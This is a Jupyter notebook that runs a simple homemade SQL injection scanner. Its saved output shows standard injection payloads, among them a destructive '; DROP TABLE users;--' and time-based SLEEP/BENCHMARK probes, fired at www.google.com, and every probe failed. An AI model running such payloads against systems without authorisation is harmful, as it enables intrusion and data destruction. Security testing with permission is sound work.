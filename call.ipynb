{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "a66ad2d3-1807-4003-adfe-2908796a489f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import scanner as sc\n",
    "import request_handler as rh\n",
    "import payload_generator as pa\n",
    "import response_analyzer as ra\n",
    "import logger as log\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42f51a56-8331-4eb1-bda8-d9aa31bcf028",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Check the SQL injection\n",
      "Scanning with GET method...\n",
      "check the basic palyloads\n",
      "Scanning with POST method...\n",
      "check the basic palyloads\n",
      "Scanning with blind SQL injection...\n",
      "check the blind palyloads\n",
      "Scanning with custom payloads...\n",
      "check the custom palyloads\n",
      "Displaying scan logs...\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' OR '1'='1\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: '; DROP TABLE users;--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' OR 1=1--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' AND 1=2--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' UNION SELECT NULL--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' OR '1'='1\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: '; DROP TABLE users;--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' OR 1=1--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' AND 1=2--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' UNION SELECT NULL--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' AND SLEEP(5)--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' OR SLEEP(5)--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' AND BENCHMARK(1000000,MD5(1))--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' OR IF(1=1,SLEEP(5),0)--\n",
      "[FAILURE] No SQL Injection found at www.google.com To Check SQL Injection Product?id= with payload: ' OR 1=1;--\n",
      "SQL injection scanner has finished.\n",
      "Have a nice day!\n"
     ]
    }
   ],
   "source": [
    "from injection import SQLInjectionScanner\n",
    "\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"Check the SQL injection\")\n",
    "    \n",
    "    # Corrected instance creation\n",
    "    sc = SQLInjectionScanner()\n",
    "    \n",
    "    test_url = input(\"Enter the URL: \")\n",
    "    test_url = test_url + \" To Check SQL Injection Product?id=\"\n",
    "    \n",
    "    # Perform a GET scan\n",
    "    print(\"Scanning with GET method...\")\n",
    "    sc.scan_get(test_url)\n",
    "\n",
    "    # Perform a POST scan\n",
    "    print(\"Scanning with POST method...\")\n",
    "    test_data = {\"input\": \"\"}\n",
    "    sc.scan_post(test_url, test_data)\n",
    "\n",
    "    # Perform a blind SQL injection scan\n",
    "    print(\"Scanning with blind SQL injection...\")\n",
    "    sc.scan_with_blind_payloads(test_url)\n",
    "\n",
    "    # Add a custom payload and scan\n",
    "    print(\"Scanning with custom payloads...\")\n",
    "    sc.add_custom_payload_and_scan(test_url, \"' OR 1=1;--\")\n",
    "\n",
    "    # Display logs\n",
    "    print(\"Displaying scan logs...\")\n",
    "    sc.show_logs()\n",
    "\n",
    "    print(\"SQL Injection Scanner Has Finished.\")\n",
    "    print(\"Have a Nice Day!\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "179dc4b3-2825-4db6-8c86-27fefe9942a2",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
